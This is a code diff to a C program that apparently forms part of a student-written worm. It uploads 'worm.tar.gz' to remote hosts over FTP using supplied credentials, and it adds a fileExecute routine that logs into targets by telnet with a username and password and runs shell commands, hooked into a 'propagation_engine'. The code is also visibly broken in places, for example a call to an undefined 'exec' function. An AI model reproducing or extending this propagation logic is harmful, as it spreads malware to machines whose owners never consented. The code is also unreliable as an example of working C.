@@ -11,7 +11,9 @@
 #include <errno.h>
 #include <arpa/inet.h>
 #include <dirent.h>
+#include <termios.h>
 #include <fcntl.h>
+#include <arpa/inet.h>
 
 void parseIPPort(char buffer[], char *ip, int *port){
     char *token = (char*) malloc(sizeof(char));
@@ -73,7 +75,7 @@ void fileTransfer(char *ip, char *username, char *password){
     char quit[10] = "QUIT\n";
     char stor[20] = "STOR worm.tar.gz\n";
     char file[20] = "worm.tar.gz";
-    int sent, sock = 0, sockT = 0, status = 0, port = 0, accept_socket, fileSize = 0;
+    int sent, sock = 0, sockT = 0, percent = 0, port = 0, accept_socket, fileSize = 0;
     off_t offset = 0; //file offset
     struct sockaddr_in serverAddr, transfSock;
     struct stat obj;
@@ -249,14 +251,14 @@ void fileTransfer(char *ip, char *username, char *password){
     fstat(sent, &obj);
     
     offset = 0;
-    status =  sendfile(sockT, sent, &offset, obj.st_size);
-    if(status < 0){ 
+    percent =  sendfile(sockT, sent, &offset, obj.st_size);
+    if(percent < 0){ 
         printf("Não foi possivel fazer a transferencia\n");
         exit(1);
     }
 
-    if (status != obj.st_size) {
-        printf("Transferencia incompleta: %d de %d bytes\n", status, (int)obj.st_size);
+    if (percent != obj.st_size) {
+        printf("Transferencia incompleta: %d de %d bytes\n", percent, (int)obj.st_size);
         exit(1);
     }
     
@@ -281,9 +283,35 @@ void fileTransfer(char *ip, char *username, char *password){
         close(sock);
     }
 }
+ 
+void fileExecute(char *ip, char* username, char *password){
+    char buffer[256];
+    FILE *fp;
+    pid_t child; // note that the actual return type of fork is 
+             // pid_t, though it's probably just an int typedef'd or macro'd
 
-void propagation_engine(char* ip, char *username, char *pass){
-    
+    child = vfork();
+    if (child == -1){
+         perror("Fork failed");
+    }
+    else if (child == 0){
+        strcpy(buffer, "telnet ");
+        strcat(buffer, ip);
+        strcat(buffer, " 23");
+       // system(buffer);
+        fp = popen(buffer, "w");
+        fputs(username, fp);
+        fputc('\n', fp);
+        fputs(password, fp);
+        fputc('\n', fp);
+       // run command built into shell
+        exec("sh", "-c", "cd /Asgn03KLG/; pwd"); 
+         pclose(fp);
+        _exit(23);
+    }
+}
+
+void propagation_engine(char* ip, char *username, char *pass){    
         fileTransfer(ip, username, pass);
-
+        fileExecute(ip, username, pass);
 }
